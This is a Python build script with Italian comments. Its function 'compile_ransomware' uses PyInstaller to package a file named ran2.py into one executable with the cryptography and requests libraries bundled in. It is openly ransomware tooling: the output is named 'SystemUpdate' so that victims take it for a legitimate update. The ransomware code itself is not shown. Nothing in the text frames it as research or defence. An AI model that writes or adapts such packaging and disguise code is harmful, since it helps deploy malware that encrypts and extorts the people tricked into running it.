import PyInstaller.__main__
import os
import platform

def compile_ransomware():
    """Compila il ransomware con le variabili integrate"""
    print("🔧 COMPILING RANSOMWARE...")
    
    pyinstaller_args = [
        'ran2.py',
        '--onefile',
        '--console',
        '--name=SystemUpdate',
        '--clean',
        '--noconfirm',
        '--distpath=./dist',
        
        # Dipendenze
        '--hidden-import=cryptography',
        '--hidden-import=cryptography.fernet',
        '--hidden-import=requests',
        '--hidden-import=sqlite3',
    ]
    
    try:
        PyInstaller.__main__.run(pyinstaller_args)
        exe_name = "SystemUpdate.exe" if platform.system() == "Windows" else "SystemUpdate"
        exe_path = f"./dist/{exe_name}"
        
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"✅ COMPILATION SUCCESSFUL!")
            print(f"📁 Output: {exe_path}")
            print(f"📊 Size: {size_mb:.2f} MB")
            print("🎯 Configuration: Embedded in executable")
            return True
        else:
            print("❌ Executable not created!")
            return False
            
    except Exception as e:
        print(f"❌ Compilation failed: {e}")
        return False

if __name__ == "__main__":
    compile_ransomware()
